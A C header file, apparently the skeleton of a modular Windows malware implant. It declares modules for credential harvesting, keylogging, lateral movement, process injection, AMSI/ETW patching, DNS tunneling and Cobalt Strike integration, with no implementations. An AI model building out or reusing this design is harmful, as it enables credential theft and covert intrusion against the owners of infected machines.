#ifndef MODULAR_PAYLOAD_H
#define MODULAR_PAYLOAD_H

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_MODULES 20

// Module IDs
typedef enum {
    MODULE_CREDENTIAL_HARVESTER = 1,
    MODULE_LATERAL_MOVEMENT = 2,
    MODULE_FILE_TRANSFER = 3,
    MODULE_PROCESS_INJECTION = 4,
    MODULE_SYSTEM_INFO = 5,
    MODULE_ETW_AMSI_PATCHER = 6,
    MODULE_CALL_STACK_SPOOFER = 7,
    MODULE_KEYLOGGER = 8,
    MODULE_SCREENSHOT = 9,
    MODULE_NETWORK_SCANNER = 10,
    // Advanced Modules
    MODULE_DNS_TUNNELING = 11,
    MODULE_SMB_BEACONING = 12,
    MODULE_POWERSHELL_EMPIRE = 13,
    MODULE_MEMORY_FORENSICS_EVASION = 14,
    MODULE_FILELESS_EXECUTION = 15,
    MODULE_COBALT_STRIKE = 16
} ModuleID;

// Module function pointer type
typedef void (*ModuleFunction)();

// Module structure
typedef struct {
    ModuleID id;
    const char* name;
    ModuleFunction execute;
} Module;

// Function prototypes
void init_modules();
int load_modules(int count, int* module_ids);
void execute_modules();
void cleanup_modules();

// Module implementations
void credential_harvester();
void lateral_movement();
void file_transfer();
void process_injection();
void system_info();
void etw_amsi_patcher();
void call_stack_spoofer();
void keylogger();
void screenshot();
void network_scanner();

// Advanced module implementations
void dns_tunneling();
void smb_beaconing();
void powershell_empire();
void memory_forensics_evasion();
void fileless_execution();
void cobalt_strike();

#endif // MODULAR_PAYLOAD_H